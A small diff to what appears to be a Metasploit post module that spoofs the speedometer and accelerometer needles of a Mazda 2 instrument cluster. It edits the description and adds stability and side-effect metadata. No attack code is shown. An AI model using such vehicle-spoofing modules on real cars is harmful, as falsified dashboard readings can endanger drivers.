@@ -10,11 +10,16 @@ class MetasploitModule < Msf::Post
       update_info(
         info,
         'Name' => 'Mazda 2 Instrument Cluster Accelorometer Mover',
-        'Description' => %q{ This module moves the needle of the accelorometer and speedometer of the Mazda 2 instrument cluster},
+        'Description' => %q{This module moves the needle of the accelorometer and speedometer of the Mazda 2 instrument cluster.},
         'License' => MSF_LICENSE,
         'Author' => ['Jay Turla'],
         'Platform' => ['hardware'],
-        'SessionTypes' => ['hwbridge']
+        'SessionTypes' => ['hwbridge'],
+        'Notes' => {
+          'Stability' => [SERVICE_RESOURCE_LOSS],
+          'SideEffects' => [SCREEN_EFFECTS],
+          'Reliability' => []
+        }
       )
     )
     register_options([
